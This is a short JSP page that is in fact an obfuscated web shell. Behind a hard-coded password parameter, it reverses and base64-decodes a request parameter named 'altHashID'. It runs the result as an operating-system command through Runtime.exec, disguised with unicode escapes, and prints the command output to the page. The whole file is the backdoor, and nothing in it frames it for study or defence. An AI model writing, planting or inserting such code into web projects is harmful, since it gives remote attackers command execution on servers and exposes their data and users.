<%@ page import="java.util.*,java.io.*" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    // --- Access Control ---
    String auth = request.getParameter("uuid");
    if (auth == null || !auth.equals("thisisatest")) {
        out.println("Access Denied");
        return;
    }

    String input = request.getParameter("altHashID");
    if (input != null && !input.trim().equals("")) {
        StringBuilder reversed = new StringBuilder(input).reverse();
        String reversedStr = reversed.toString();

        byte[] decodedBytes = java.util.Base64.getDecoder().decode(reversedStr);
        String dmc = new String(decodedBytes);

        Process p = java.lang.\u0052untime.get\u0052untime().\u0065xec(dmc);
        java.io.InputStream in = p.getInputStream();
        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));
        String line = null;
        while ((line = reader.readLine()) != null) {
            out.println(line + "<br/>");
        }
    } else {
        out.println("Error, invalid input provided.");
    }
%>
